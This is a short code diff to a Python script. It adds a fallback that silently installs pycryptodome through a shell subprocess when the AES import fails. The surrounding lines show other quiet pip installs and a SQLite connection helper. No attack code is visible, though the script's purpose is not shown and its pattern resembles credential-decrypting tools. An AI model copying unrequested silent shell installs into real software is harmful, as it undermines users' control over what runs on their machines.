@@ -52,7 +52,12 @@ for module in requirements:
     except:
         subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
         time.sleep(3)
-from Cryptodome.Cipher import AES
+try:
+    from Cryptodome.Cipher import AES
+except:
+    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
+    from Crypto.Cipher import AES
+    
 import requests
 def sql_connect(database_path):
     conn = sqlite3.connect(database_path)
